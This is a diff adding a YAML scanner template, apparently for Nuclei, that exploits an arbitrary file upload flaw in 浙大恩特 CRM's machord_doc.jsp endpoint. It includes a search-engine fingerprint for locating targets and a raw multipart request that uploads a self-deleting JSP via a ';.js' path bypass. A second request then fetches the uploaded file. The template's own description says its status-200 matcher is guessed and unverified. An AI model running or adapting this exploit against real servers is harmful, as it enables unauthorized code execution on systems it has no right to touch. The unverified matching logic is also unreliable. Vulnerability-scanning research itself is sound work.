@@ -1,0 +1,86 @@
+id: poc-0e1ee459f5e64a7c1b74
+info:
+  name: 浙大恩特CRMmachord_doc任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0e1ee459f5e64a7c1b748a9c43c3bd52
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 0e1ee459f5e64a7c1b748a9c43c3bd52
+    fofa: + hunter`app.name="浙大恩特 CRM"`
+http:
+- raw:
+  - 'POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName=stc.jsp&strAffixStr&oprfilenam=null&gesnum HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 575
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="oprfilenam"
+
+
+    null
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadflg"
+
+
+    0
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="strAffixStr"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="selfilenam"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadfile"; filename="stc.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /enterdoc/Machord/stc.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
